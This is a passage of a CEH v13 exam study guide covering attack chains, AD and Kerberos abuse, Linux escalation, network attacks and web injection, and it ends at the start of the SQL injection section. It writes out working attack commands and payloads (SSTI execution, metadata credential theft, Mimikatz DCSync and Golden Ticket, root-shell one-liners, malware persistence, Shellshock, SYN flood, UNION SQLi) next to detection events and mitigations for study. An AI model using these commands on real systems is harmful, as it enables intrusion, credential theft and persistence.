# CEH v13 Master Exam Knowledge Matrix & Attack Chain Architecture (Complete 6-Test Exhaustive Synthesis)

> **Document Scope:** Full, line-by-line synthesis across Practice Tests 1, 2, 3, 4, 5, and 6 (675 Questions).  
> **Repository Format:** Strict GitHub-Flavored Markdown (GFM). Zero omitted terms, tools, flags, CVEs, ports, or detection artifacts.

---

# 1. Multi-Stage Correlated Attack Chains

* **Phase 1:** OSINT & Surface Mapping
* **Phase 2:** Initial Access & Weaponization
* **Phase 3:** Host Triage & Local Privilege Escalation
* **Phase 4:** Active Directory Forest Takeover
* **Phase 5:** Lateral Movement, Cloud/K8s Pivot & Actions on Objectives

---

## Attack Chain 1: External Cloud Compromise & Workload Ransomware

### Surface Discovery & OSINT
* Attacker queries Certificate Transparency logs (crt.sh) and leverages Amass/Subfinder to discover unlinked subdomains (dev-api.target.com).
* Evaluates corporate job postings via NLP pipelines to identify technology dependencies (AWS GovCloud, Python, Docker, Terraform).

### Initial Foothold (SSRF Vulnerability)
* Locates an unvalidated URL fetch parameter on dev-api.target.com.
* Sends an SSRF request targeting the link-local Instance Metadata Service:
  * For EC2 (IMDSv1): `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]`
  * For Lambda/ECS: `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`
* Extracts temporary IAM STS session credentials (AccessKeyId, SecretAccessKey, SessionToken).

### Privilege Escalation & Cloud Pivot
* Configures local AWS CLI: `aws sts get-caller-identity`.
* Maps policy permissions: `aws iam list-attached-role-policies` -> discovers `iam:PassRole` and `lambda:CreateFunction`.
* Deploys a malicious Lambda function with an attached administrative role (AdministratorAccess) to bypass boundary restrictions.

### Cloud Impact & Workload Ransomware
* Enumerates S3 buckets: `aws s3 ls --no-sign-request`.
* Deletes object versioning, deletes EBS volume snapshots, disables Azure Recovery Services / AWS backup vaults, and exfiltrates proprietary codebases via S3 buckets configured with `s3:PutObject`.

### Root-Cause Mitigations
* Enforce IMDSv2: `aws ec2 modify-instance-metadata-options --http-tokens required`.
* Implement strict IAM permission boundaries and eliminate `*/*` wildcard privileges.
* Enforce S3 Object Lock (immutable storage) and isolate backup vaults in a dedicated AWS account.

---

## Attack Chain 2: Active Directory Forest Takeover via Coerced Authentication & Delegation Abuse

### Network Discovery & Initial Foothold
* Discovers an exposed web application vulnerable to Server-Side Template Injection (SSTI) in Jinja2: `{{ ''.__class__.__mro__[1].__subclasses__()[279]('id',shell=True,stdout=-1).communicate() }}`
* Spawns a low-privilege reverse shell on port 4444 (`whoami` returns `www-data`).

### Local Host Triage & Privilege Escalation
* Executes local enumeration: checks `sudo -l` -> discovers `(ALL) NOPASSWD: /bin/vim`.
* Spawns a root shell: `sudo vim -c ':!/bin/bash'`.
* Extracts domain join credentials stored in memory or a mounted share containing `passwords.kdbx` (cracked via `keepass2john` and `hashcat -m 13400`).

### Active Directory Enumeration & Delegation Traps
* Runs BloodHound collector (`SharpHound.exe`) or `rpcclient -U '' target -N` to map domain trust relationships.
* Identifies a web server configured with Unconstrained Delegation and discovers an unpatched Domain Controller running the Print Spooler service (`MS-RPRN`).

### Coerced Authentication & TGT Harvesting
* Executes `SpoolSample.exe` or `PrinterBug.py` targeting the Domain Controller, forcing the DC computer account (`DC01$`) to authenticate to the unconstrained delegation host over SMB/RPC.
* The DC's Ticket Granting Ticket (TGT) is automatically cached in `lsass.exe` on the compromised server.
* Dumps the DC's TGT using Mimikatz: `sekurlsa::tickets /export`.

### Domain Persistence (DCSync & Golden Ticket)
* Uses the harvested `DC01$` TGT to execute a DCSync attack via the Directory Replication Service protocol: `lsadump::dcsync /domain:corp.local /user:krbtgt`.
* Extracts the `krbtgt` NTLM hash.
* Forges a Golden Ticket (valid up to 10 years): `kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:[NTLM_HASH] /id:500 /ptt`.

### Artifacts & Detection
* Event ID 4768 / 4769: Unusual Kerberos ticket requests for high-privilege accounts.
* Event ID 4662: Operation performed on domain objects (`DS-Replication-Get-Changes-All`).
* Event ID 4771: Kerberos pre-authentication failure from anomalous hosts.

### Root-Cause Mitigations
* Disable the Windows Print Spooler service on all Domain Controllers.
* Remove `TrustedForDelegation` (Unconstrained Delegation) from all domain member servers.
* Add all administrative accounts to the Protected Users security group.
* Rotate the `krbtgt` account password twice to invalidate existing forged tickets.

---

## Attack Chain 3: Web Supply Chain, Kubernetes Breakout & Kernel Exploitation

### Supply Chain Compromise
* Exploits a typo-squatted package (`python:3.11-s1im` or trojanized PyPI/npm dependency) pulling in malicious code during container build.

### Server-Side Prototype Pollution to RCE
* Injects properties into `Object.prototype` via an unvalidated merge function to poison `child_process.spawn` options, establishing an interactive shell inside a container pod.

### Kubernetes API Server Escalation & Container Escape
* Extracts the service account token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`.
* Enumerates permissions: `kubectl auth can-i --list`.
* Discovers the service account is bound to `cluster-admin` via a misconfigured `ClusterRoleBinding`.
* Enumerates secrets: `kubectl get secrets -A -o yaml`.
* Deploys a privileged container mounting the host root filesystem (`/`) or executes Dirty Pipe (CVE-2022-0847) / runc binary overwrite (CVE-2019-5736) via `/proc/self/exe` to break out to the host node.

### Root-Cause Mitigations
* Enforce image digest pinning (`python@sha256:...`) and Sigstore/Cosign signature verification in admission controllers.
* Set `automountServiceAccountToken: false` on pods that do not interact with the Kubernetes API.
* Enforce Pod Security Admission (PSA) at restricted profile in enforce mode.

---

# 2. Comprehensive Domain-by-Domain Technical Register

## Domain 1: Footprinting, Reconnaissance & OSINT

* **Google Dorking Syntax & Operators:**
  * `site:` restricts queries to a specific domain (`site:target.com`).
  * `filetype:` / `ext:` isolates file extensions (`filetype:env`, `filetype:config`, `filetype:kdbx`, `filetype:pdf`).
  * `intitle:` / `inurl:` searches within HTML page titles or URL paths (`inurl:admin/login.php`, `intitle:"index of /"`).
  * Database Exposure Dork: `site:targetcorp.com filetype:env OR filetype:config intitle:"database"`.
  * Managed centrally via the Google Hacking Database (GHDB).
* **WHOIS & Registrant Data:**
  * Queries Regional Internet Registry (RIR) databases (ARIN, RIPE, APNIC, AFRINIC, LACNIC) to extract domain creation/expiry dates, administrative contacts, name servers, and autonomous system numbers (ASNs).
  * Attackers abuse WHOIS privacy protection services and bulletproof registrars to hide operational attribution.
* **theHarvester:**
  * OSINT aggregation tool searching public search engines (Google, Bing), LinkedIn, and PGP key servers for employee email addresses, names, subdomains, and IP ranges (`theHarvester -d target.com -b google,linkedin`).
* **Recon-ng:**
  * Modular, workspace-driven OSINT framework modeled after Metasploit. Modules include `recon/domains-hosts/*`, `recon/contacts/*`, and `recon/companies-contacts/*`.
* **Maltego:**
  * Visual entity relationship and link-analysis graph tool utilizing Transforms to map nodes (Domain -> DNS -> IP -> Netblock -> ASN -> Organization -> Email -> Person -> Social Media Profile).
* **FOCA (Fingerprinting Organizations with Collected Archives):**
  * Automated tool that scrapes documents (`.pdf`, `.docx`, `.xlsx`, `.pptx`) from target domains via search engines, extracting EXIF and XML metadata revealing internal usernames, operating system versions, software builds (Office 2016, Adobe Acrobat), local printer shares, and network paths.
* **Certificate Transparency (CT) Logs:**
  * Public, append-only cryptographic ledgers (mandated by RFC 6962) where Certificate Authorities log all issued X.509 SSL/TLS certificates.
  * Attackers query search engines like `crt.sh` using wildcards (`site:%.target.com`) or Censys to discover unlinked subdomains, dev/staging servers, and newly provisioned internal resources without generating target traffic.
* **Passive DNS Replication:**
  * Historical DNS resolution databases (Farsight DNSDB, SecurityTrails, VirusTotal) capturing past IP-to-domain mappings. Allows tracking C2 infrastructure migration, IP rotation, and discovering shared hosting environments used by threat actors.
* **DNS Zone Transfer (AXFR):**
  * Mechanism for synchronizing zone files between primary and secondary DNS servers over TCP port 53.
  * Misconfigured servers allowing open AXFR queries (`dig axfr @ns1.target.com target.com` or `nslookup -type=any -ls target.com`) reveal all host records, subdomains, and mail exchangers.
  * Mitigation: Restrict AXFR to authorized secondary DNS server IPs via `allow-transfer` ACLs and enforce TSIG (Transaction Signature) keys.
* **DNSSEC Record Types (NSEC vs. NSEC3):**
  * DNSSEC: Digitally signs DNS records using public-key cryptography (RRSIG records) to ensure authenticity and prevent DNS cache poisoning.
  * NSEC (Next SECure): Proves non-existence of a queried name by pointing to the next alphabetical record in the zone; enables Zone Walking (`ldns-walk`) to enumerate all zone records sequentially.
  * NSEC3: Prevents zone walking by replacing plaintext record names with salted cryptographic hashes (though hashes can still be cracked offline using Hashcat).
* **DNS over HTTPS (DoH - Port 443/TCP):**
  * Encrypts DNS queries inside standard HTTPS traffic sent to public resolvers (`1.1.1.1`, `8.8.8.8`).
  * Bypasses enterprise internal DNS servers, monitoring pipelines, and protective DNS sinkholes.
* **BGP Hijacking & Route Leaks:**
  * BGP Hijacking: Illegitimately announcing more specific IP prefix routes (e.g., `/24` instead of `/16`) to force global internet traffic to route through an attacker-controlled Autonomous System (AS). Mitigated by RPKI (Resource Public Key Infrastructure).
  * BGP Route Leak: Accidental propagation of internal routing announcements beyond their intended scope, causing massive traffic misdirection.
* **Shodan Search Engine:**
  * Internet-wide port and service banner scanner indexing IoT, ICS/SCADA, servers, and routers.
  * Queries: `port:3389 has_screenshot:true` (finds exposed RDP login screens), `port:502` (finds unauthenticated Modbus ICS devices), `org:"TargetCorp" port:22 product:"OpenSSH" version:"7.4"`.
* **Job Posting Intelligence (Competitive Intelligence):**
  * Analyzing corporate hiring postings (LinkedIn, Indeed) to identify internal security appliances (e.g., Palo Alto PAN-OS, Cisco ASA), cloud environments (AWS GovCloud), database engines, and software versions without sending active probes to target infrastructure.
* **Wayback Machine (web.archive.org):**
  * Historical web archive querying revealing past exposures of sensitive files (e.g., `/admin/config.php.bak`) that leak connection strings, database credentials, and legacy architectures.
* **Subdomain Enumeration Toolchain:**
  * Brute-force: `dnsrecon -d target.com -D wordlist.txt -t brt`, `gobuster dns -d target.com -w wordlist.txt`.
  * Passive aggregation: `Amass enum -d target.com`, `Sublist3r -d target.com`.
* **Email Header Footprinting:**
  * Analyzing `Received:` hops and `X-Originating-IP` headers in inbound emails to map internal mail server infrastructure, perimeter gateways, and sending client versions.
* **DNS Resource Records for Email Security:**
  * MX (Mail Exchange): Identifies mail gateway provider (e.g., `mail.protection.outlook.com`).
  * SPF (Sender Policy Framework): TXT record specifying authorized sending IPs (`v=spf1 include:spf.protection.outlook.com include:sendgrid.net ~all`). `~all` = SoftFail (spoofing possible); `-all` = HardFail.
  * DMARC (Domain-based Message Authentication, Reporting, and Conformance): TXT record at `_dmarc.target.com` specifying enforcement policies (`p=none`, `p=quarantine`, `p=reject`).

---

## Domain 2: Scanning Networks & Vulnerability Analysis

* **Nmap Scan Type Decision Matrix:**
  * SYN Stealth (`-sS`): Sends SYN. Open -> SYN/ACK received, responds with RST (half-open). Closed -> RST/ACK. Filtered -> No response / ICMP unreachable. Requires root.
  * TCP Connect (`-sT`): Completes full 3-way handshake (SYN -> SYN/ACK -> ACK). Leaves heavy logs. Used when raw socket access is unavailable.
  * ACK Scan (`-sA`): Sends ACK. Maps firewall rulesets, never determines open ports. Unfiltered -> RST. Filtered -> No response / ICMP error.
  * Inverse Scans (Null `-sN`, FIN `-sF`, Xmas `-sX`): Xmas sets FIN, URG, PSH. RFC 793 compliant systems (Linux/BSD): Open -> No response; Closed -> RST/ACK. Windows systems drop all probes (appear closed/filtered).
  * UDP Scan (`-sU`): Sends empty UDP probe. Open -> UDP service reply. Open/Filtered -> No response. Closed -> ICMP Type 3 Code 3 (Port Unreachable).
  * Idle / Zombie Scan (`-sI <zombie_ip>`): Completely blind scan using a zombie host with predictable, incremental IP IDs (RFC 791). Probe zombie IP ID -> spoof SYN to target from zombie -> probe zombie IP ID again (increment of 2 = target port open).
* **Nmap Timing & Performance Flags:**
  * `-T0` (Paranoid), `-T1` (Sneaky), `-T2` (Polite - evades simple rate-based IDS), `-T3` (Normal - default), `-T4` (Aggressive), `-T5` (Insane).
  * `--randomize-hosts`: Scans targets in non-sequential order to defeat sweep detection signatures.
  * `--scan-delay <time>`: Enforces fixed wait intervals between consecutive probes to fall below IDS threshold windows.
* **Nmap Evasion Flags:**
  * `-f` / `--mtu 8`: Fragments packets into 8-byte chunks to prevent IDS signature matching across packet boundaries.
  * `-D RND:10` / `-D decoy1,decoy2,ME`: Injects spoofed decoy IP addresses into the scan stream.
  * `-g 53` / `--source-port 53`: Spoofs source port as DNS (UDP/TCP 53) or HTTP (80) to bypass stateless firewall ACLs.
  * `--data-length <bytes>`: Appends random payload padding bytes to standard probe packets.
* **Nmap NSE Vulnerability Scripts:**
  * `smb-vuln-ms17-010`: Detects EternalBlue SMBv1 remote code execution (CVE-2017-0144).
  * `http-vuln-cve2017-5638`: Detects Apache Struts2 OGNL remote command injection.
  * `ssl-heartbleed`: Detects OpenSSL TLS heartbeat memory disclosure (CVE-2014-0160).
  * `ssl-poodle`: Detects SSL 3.0 CBC padding oracle vulnerability (CVE-2014-3566).
* **Compound Reconnaissance Command:** `nmap -sS -sV -O --script=vuln -T3 -p 1-65535 192.168.1.0/24 -oA network_audit` (Executes half-open SYN scan, service versioning, OS detection, full-range scanning, and vulnerability scripts simultaneously).
* **Port State Definitions:**
  * Open: Target accepts connection; service listening.
  * Closed: Host returns RST/ACK; no service listening on port.
  * Filtered: Probe dropped by firewall/packet filter; no response or ICMP unreachable returned.
  * Unfiltered: Port accessible, but open/closed status cannot be determined (result of ACK scan returning RST).
  * Open|Filtered: No response received from UDP, Null, FIN, or Xmas scans.
* **Host Discovery Probing:**
  * `nmap -sn -PS80,443 -PA80,443 192.168.1.0/24`: Bypasses ICMP-blocking firewalls by sending TCP SYN and ACK probes to ports 80 and 443.
* **hping3 Packet Crafting:**
  * TCP SYN Traceroute: `hping3 -S -p 80 -c 3 --traceroute target.com` (maps route through firewalls dropping ICMP).
  * SYN Flood: `hping3 -S --flood -V -p 80 target.com`.
* **CVSS v3.1 Scoring Metrics:**
  * Base Score: Intrinsic qualities of a vulnerability (Attack Vector: Network/Adjacent/Local/Physical, Attack Complexity: Low/High, Privileges Required: None/Low/High, User Interaction: None/Required, Scope: Unchanged/Changed, Confidentiality/Integrity/Availability: None/Low/High).
  * Temporal Score: Exploit Code Maturity, Remediation Level, Report Confidence.
  * Environmental Score: Modified Base Metrics adjusted for organization-specific compensating controls (e.g., WAF, network isolation) and Confidentiality/Integrity/Availability requirements.
  * Severity Tiers: None (0.0), Low (0.1–3.9), Medium (4.0–6.9), High (7.0–8.9), Critical (9.0–10.0).
* **EPSS (Exploit Prediction Scoring System):**
  * Maintained by FIRST.org; ML-driven model predicting the probability (0.0 to 1.0) that a software vulnerability will be exploited in the wild within 30 days. Used alongside CVSS in Risk-Based Vulnerability Management (RBVM).
* **False Positive Validation Methodology:**
  * Scanners (OpenVAS, Nessus) often flag vulnerabilities based strictly on software version strings without verifying patch backporting.
  * Validation: Manually verify exploitability using non-destructive proof-of-concept scripts or Metasploit auxiliary scanner modules before reporting.

  ---

  ## Domain 3: Enumeration, Sniffing & Layer 2 Network Attacks

* **SNMP Enumeration (Simple Network Management Protocol):**
  * Operates over UDP port 161 (queries) and UDP port 162 (traps).
  * Default Community Strings: `public` (Read-Only), `private` (Read-Write).
  * High-Yield MIB OID Branches:
    * `1.3.6.1.2.1.1` (`system`): Hardware, OS, sysDescr, uptime.
    * `1.3.6.1.2.1.2.2` (`ifTable`): Network interface parameters and MACs.
    * `1.3.6.1.2.1.4.20` (`ipAddrTable`): Configured IP addresses.
    * `1.3.6.1.2.1.4.22` (`ipNetToMediaTable`): IP-to-physical MAC mapping (ARP cache).
    * `1.3.6.1.2.1.6.13` (`tcpConnTable`): Active TCP connection endpoints.
    * `1.3.6.1.2.1.25.4.2.1.2` (`hrSWRunName`): Table of running active processes.
    * `1.3.6.1.2.1.25.6.3.1.2` (`hrSWInstalledName`): Table of installed software packages.
  * Tools: `onesixtyone -c community.txt -i targets.txt` (brute-force), `snmpwalk -v2c -c public target OID`.
* **SMB & Null Session Enumeration:**
  * Operates over TCP port 445 (Direct Host SMB) and TCP port 139 (NetBIOS Session).
  * Null Session Command: `net use \\target\IPC$ "" /u:""`.
  * Abuses SAMR (Security Account Manager Remote) and LSARPC named pipes to enumerate domain accounts, security groups, shares, and password policies.
  * Tools: `enum4linux -a target`, `rpcclient -U "" target -N` (commands: `enumdomusers`, `enumdomgroups`, `querydominfo`, `netshareenumall`), `crackmapexec smb <subnet>` / `netexec`.
* **NetBIOS Name Service Types:**
  * Operates over UDP port 137 (Name), UDP port 138 (Datagram), TCP port 139 (Session).
  * High-Yield NetBIOS Suffixes:
    * `<00>`: Workstation Service (Machine name) / Domain name.
    * `<03>`: Messenger Service.
    * `<1B>`: Domain Master Browser (Primary Domain Controller / PDC).
    * `<1C>`: Domain Controllers group.
    * `<1D>`: Local Master Browser.
    * `<1E>`: Browser Election Service (participates in subnet resource election).
    * `<20>`: File Server Service (active SMB resource sharing).
  * Tools: `nbtstat -A <ip>` (Windows), `nbtscan <subnet>` (Linux).
* **LDAP Enumeration:**
  * Operates over TCP port 389 (LDAP) and TCP port 636 (LDAPS); Global Catalog on TCP port 3268 / 3269.
  * Anonymous binds allow unauthenticated queries to dump the directory schema: `ldapsearch -x -h 10.0.0.5 -b "dc=corp,dc=local" -D "" -w "" "(objectClass=user)" sAMAccountName`.
  * Mitigation: Enforce LDAP Signing and Channel Binding (KB4520412 / ADV190023) and set `dsHeuristics` to restrict anonymous binds.
* **SMTP Enumeration Commands:**
  * `VRFY <user>`: Asks the mail server to verify if a user exists.
  * `EXPN <list>`: Expands and returns all members of a mailing list.
  * `RCPT TO:<user>`: Verifies delivery recipient during simulated mail transaction.
  * Response Codes: 250 (User valid), 252 (Cannot verify but accepts message), 550 (User not found).
  * Tool: `smtp-user-enum -M VRFY -U users.txt -t <mail_ip>`.
* **NFS Enumeration (Network File System):**
  * Queries portmapper and mountd on TCP/UDP port 2049: `showmount -e <target>`.
  * Vulnerability: Exports configured with `no_root_squash` allow remote mounting clients with local root UID (0) to access and write files as root on the server.
* **ARP Cache Poisoning (ARP Spoofing):**
  * Sends forged, gratuitous ARP replies associating the attacker's MAC address with the default gateway's IP address.
  * Tools: `Ettercap`, `arpspoof`, `Bettercap`, `Cain & Abel`.
  * Wireshark Filter: `arp.duplicate-address-detected` or `arp.opcode == 2`.
  * Mitigation: Dynamic ARP Inspection (DAI) on switches paired with DHCP Snooping.
* **DHCP Starvation & Rogue DHCP Gateway Attack:**
  * Phase 1 (Starvation): Floods DHCP servers with thousands of `DHCPDISCOVER` packets carrying randomized source MACs using `Yersinia`, exhausting the IP address lease pool.
  * Phase 2 (Rogue DHCP): Attacker launches a rogue DHCP server assigning the attacker's IP as the default gateway and DNS resolver for all subsequent client lease requests.
  * Mitigation: Enable DHCP Snooping (designating authorized switch ports as "trusted" and client ports as "untrusted").
* **MAC Flooding Attack:**
  * Floods a network switch's Content Addressable Memory (CAM) table with forged source MAC addresses using `macof` (~150,000 packets/min).
  * Result: Once the CAM table overflows, the switch fails open and behaves like a hub, broadcasting all unicast traffic out every port.
  * Mitigation: Switch Port Security (`switchport port-security maximum 1`, `switchport port-security violation restrict/shutdown`).
* **VLAN Hopping Techniques:**
  * Switch Spoofing: Attacker sends Dynamic Trunking Protocol (DTP) frames from host NIC to negotiate a trunk link with the switch, gaining access to all routed VLANs. (Fix: `switchport nonegotiate`).
  * Double Tagging (802.1Q Double Encapsulation): Attacker crafts frames with two 802.1Q tags. The outer tag matches the native VLAN (stripped by the first switch) and the inner tag targets the victim VLAN. One-way traffic injection. (Fix: Change Native VLAN on all trunks to an unused VLAN ID like 999).
* **Spanning Tree Protocol (STP) Manipulation:**
  * Injects forged Bridge Protocol Data Units (BPDUs) with priority 0 using `Yersinia` to claim the Root Bridge role and force network traffic rerouting. (Fix: Enable BPDU Guard and Root Guard).
* **Cleartext Protocol Sniffing & Filters:**
  * FTP: `ftp.request.command == "USER" || ftp.request.command == "PASS"` (Port 21).
  * Telnet: `tcp.port == 23` (entire session in cleartext).
  * HTTP: `http.request.method == "POST"` (captures form credentials).
* **Passive Switched Sniffing (SPAN & TAPs):**
  * SPAN (Switched Port Analyzer): Control-plane port mirroring copying traffic from source ports to a monitor port without injecting data-plane frames.
  * Network TAP (Test Access Point): Inline physical hardware splitting network signals for non-intrusive full packet capture.

---

## Domain 4: System Hacking, Windows Internals & Active Directory

* **Active Directory Kerberos Authentication Flow:**
  * AS-REQ / AS-REP: Client sends timestamp encrypted with user password hash to KDC (`AS-REQ`). KDC validates and returns Ticket Granting Ticket (TGT) encrypted with `krbtgt` NTLM hash (`AS-REP`). (Windows Event ID 4768).
  * TGS-REQ / TGS-REP: Client presents TGT to KDC requesting service ticket (`TGS-REQ`). KDC returns Service Ticket (`TGS-REP`) encrypted with target service account's NTLM hash. (Windows Event ID 4769).
  * AP-REQ / AP-REP: Client presents Service Ticket to target application server for service access.
* **Golden Ticket vs. Silver Ticket:**
  * Golden Ticket: Forged TGT generated using the `krbtgt` account NTLM hash. Grants unrestricted domain administrator access to any resource across the forest for up to 10 years. (Remediation: Reset the `krbtgt` password twice to invalidate current and prior generation tickets).
  * Silver Ticket: Forged TGS generated using the target service account's NTLM hash. Allows access to that specific service only (e.g., MSSQL, CIFS, HTTP) without contacting the KDC.
* **Kerberoasting:**
  * Authenticated domain user requests TGS tickets for accounts that have a Service Principal Name (SPN) registered (`GetUserSPNs.py`).
  * The ticket blob returned is encrypted with the service account's NTLM hash. The attacker extracts and cracks this ticket offline (`hashcat -m 13100`).
* **AS-REP Roasting:**
  * Targets accounts with `Do not require Kerberos preauthentication` (`DONT_REQUIRE_PREAUTH`) enabled.
  * Attacker requests an AS-REP ticket without supplying initial password proof; cracks the returned encrypted payload offline (`hashcat -m 18200`).
* **Kerberos Pre-Authentication Brute-Forcing (`kerbrute`):**
  * Sends AS-REQ packets directly to the KDC to test password guesses without triggering standard interactive logon failures. Generates Windows Event ID 4771 rather than Event ID 4625.
* **AD CS ESC1 Exploitation (Active Directory Certificate Services):**
  * Exploits certificate templates that have `ENROLLEE_SUPPLIES_SUBJECT` enabled and Client Authentication EKU configured.
  * Any standard domain user can request a certificate on behalf of a Domain Admin (`Certify.exe request /ca:... /template:ESC1 /altname:Administrator`) and exchange it for a Kerberos TGT using `Rubeus asktgt`.
* **Resource-Based Constrained Delegation (RBCD):**
  * Attacker with write access (`GenericWrite` or `WriteProperty`) over a target computer object configures its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to trust an attacker-controlled machine account (created via `PowerMad`). The attacker then executes `S4U2Self` + `S4U2Proxy` via `Rubeus` to impersonate any domain administrator to that target host.
* **S4U Protocol Transition Abuse (S4U2Self + S4U2Proxy):**
  * `S4U2Self` allows a service account configured with constrained delegation and protocol transition (`TrustedToAuthForDelegation`) to obtain a Kerberos service ticket to itself on behalf of any domain user.
  * `S4U2Proxy` uses that ticket to obtain a TGS ticket to target services authorized in `msDS-AllowedToDelegateTo`.
* **Unconstrained Delegation & Coerced Authentication:**
  * Servers configured with unconstrained delegation cache full copies of connecting users' TGTs in `lsass.exe` memory. Coercing a Domain Controller to authenticate to an unconstrained server (via PrinterBug / SpoolSample `MS-RPRN`) permits extracting the DC's TGT using Mimikatz.
* **DCSync Attack:**
  * Abuses Directory Replication Service (DRS) protocol permissions (`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`) using `Mimikatz lsadump::dcsync /user:krbtgt` to extract account password hashes directly from the KDC over RPC without running code on the DC. (Event ID 4662).
* **Skeleton Key Attack:**
  * Memory-only patch injected into `lsass.exe` on a Domain Controller (`Mimikatz misc::skeleton`). Causes the DC to accept a master password (e.g., `mimikatz`) for every domain user account while legitimate passwords continue to work. Does not survive reboots.
* **Pass-the-Hash (PtH) vs. Pass-the-Ticket (PtT):**
  * Pass-the-Hash (PtH): Authenticates across SMB/RPC/WMI using raw NTLM hashes without cracking them (`psexec.py`, `crackmapexec`).
  * Pass-the-Ticket (PtT): Injects stolen or forged Kerberos tickets (`.kirbi` or `.ccache`) directly into memory (`Mimikatz kerberos::ptt`).
  * OverPass-the-Hash: Uses NTLM hash to request a Kerberos TGT (`sekurlsa::pth`), moving from NTLM to Kerberos authentication.
* **NetNTLMv2 Options & Constraints:**
  * NetNTLMv2 challenge-response hashes (captured via Responder) cannot be used directly in Pass-the-Hash attacks.
  * Options: (1) Crack offline via Hashcat mode 5600 (`hashcat -m 5600 hash.txt wordlist.txt`), or (2) Relay in real-time to SMB/LDAP endpoints lacking SMB signing using `ntlmrelayx.py`.
* **Azure AD (Entra ID) Pass-the-PRT & Pass-the-Certificate:**
  * Pass-the-PRT: Stealing the long-lived Primary Refresh Token (PRT) from an Entra ID joined device (`Mimikatz sekurlsa::cloudap` or `ROADtoken`) to access M365/Azure services without MFA prompts.
  * Pass-the-Certificate: Extracting PKCS#12 device certificates (`.pfx`) from Azure-enrolled devices to authenticate to cloud endpoints.
* **Windows Credential Guard:**
  * Uses Virtualization-Based Security (VBS) to isolate credential secrets (NTLM hashes, Kerberos keys) in an isolated `LSAIso` process, preventing Mimikatz from reading LSASS memory.
* **Windows Persistence Mechanisms:**
  * Registry Run Keys: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` and `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
  * Scheduled Tasks: `schtasks /create /sc onlogon /tn "Update" /tr "C:\malware.exe"`. (Stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks` and `C:\Windows\System32\Tasks`).
  * Services: `sc create Backdoor binpath= "C:\malware.exe" start= auto`. (Event ID 7045).
  * WMI Event Subscriptions (Fileless): Permanent `__EventFilter`, `__EventConsumer`, and `__FilterToConsumerBinding` stored in the CIM repository (`ROOT\subscription`). (Sysmon Events 19, 20, 21 / WMI Event 5861).
  * Image File Execution Options (IFEO) Hijacking: Setting the Debugger value under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe` to spawn `cmd.exe` on sticky keys.
  * DLL Sideloading / Search Order Hijacking: Placing a malicious DLL in an application directory ahead of system paths so a trusted executable loads the malicious library upon execution.
* **Token Impersonation & Potato Exploits:**
  * Exploiting `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`:
    * PrintSpoofer: `PrintSpoofer.exe -i -c cmd` (abuses Named Pipe impersonation via the Print Spooler on Windows 10 / Server 2019).
    * JuicyPotato: Abuses DCOM activation and BITS on older Windows versions.
* **Unquoted Service Paths:**
  * Windows services running unquoted paths containing spaces (e.g., `C:\Program Files\Sub Dir\app.exe`) execute intermediate binaries (`C:\Program.exe`) if write permissions exist on the parent folder.
  * Enumeration: `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"`.
* **PrintNightmare (CVE-2021-1675 / CVE-2021-34527):**
  * Vulnerability in the Windows Print Spooler service allowing unauthenticated remote code execution and local privilege escalation to SYSTEM via `RpcAddPrinterDriverEx`.
* **MS17-010 (EternalBlue):**
  * Critical SMBv1 buffer overflow exploited by WannaCry and NotPetya. Scanned using `nmap -p 445 --script smb-vuln-ms17-010`.
* **Mimikatz WDigest Plaintext Extraction:**
  * `sekurlsa::wdigest` retrieves plaintext credentials from LSASS memory if `UseLogonCredential=1` is set under `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`.
* **KeePass Database Cracking:**
  * Extraction and cracking of `.kdbx` password databases: `keepass2john passwords.kdbx > keepass.hash` -> `hashcat -m 13400 keepass.hash wordlist.txt`.

---

## Domain 5: Linux Internals, Kernel CVEs & Privilege Escalation

* **Linux Post-Exploitation Progression:**
  * Standard initial foothold yields unprivileged user (e.g., `www-data`). The immediate operational priority is Local Privilege Escalation to root before network pivoting.
* **Sudo GTFOBins Privilege Escalation:**
  * Exploiting `sudo -l` permissions configured with `NOPASSWD`:
    * `sudo vim -c ':!/bin/bash'`
    * `sudo find / -exec /bin/sh \;`
    * `sudo less /etc/profile` -> type `!/bin/sh`
    * `sudo python3 -c 'import os; os.system("/bin/bash")'`
* **SUID / SGID Binary Exploitation:**
  * Locating SUID root binaries: `find / -perm -4000 -type f 2>/dev/null`.
  * Python SUID Exploitation: `python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`.
* **Linux Kernel Privilege Escalation CVEs:**
  * Dirty COW (CVE-2016-5195): Race condition in the Copy-On-Write (COW) memory subsystem allowing unprivileged users to overwrite read-only files.
  * Dirty Pipe (CVE-2022-0847): Unprivileged write access to page cache files via pipe buffers; allows modifying `/etc/passwd` directly.
  * PwnKit (CVE-2021-4034): Memory corruption in Polkit's `pkexec` binary present on default Linux distributions.
  * RegreSSHion (CVE-2024-6387): Signal handler race condition in OpenSSH server (`sshd`) on glibc-based systems allowing unauthenticated remote code execution as root.
* **Shellshock (CVE-2014-6271):**
  * Vulnerability in GNU Bash parsing environment variables. Attackers pass crafted functions (`() { :; }; /bin/cat /etc/passwd`) inside HTTP headers (User-Agent, Referer) processed by Apache CGI scripts.
* **TOCTOU (Time-of-Check to Time-of-Use):**
  * Concurrency race condition where an application verifies file access permissions and subsequently operates on the file, allowing an attacker to swap the file (via symlinks) during the execution window.
* **Kernel Rootkit Detection:**
  * Rootkits hooking `getdents64` system calls hide malicious files from `ls` and `find`.
  * Forensic Detection: Boot system from a trusted live CD/USB and analyze raw disk filesystem structures using The Sleuth Kit (`fls`) or memory analysis via Volatility (`linux_find_file`).

---

## Domain 6: Web Applications, APIs & Modern Injection Attacks

* **SQL Injection Types & Payloads:**
  * In-Band / Union-Based: Retrieves data directly in the HTTP response (`' UNION SELECT NULL,NULL,username,password FROM users--`).
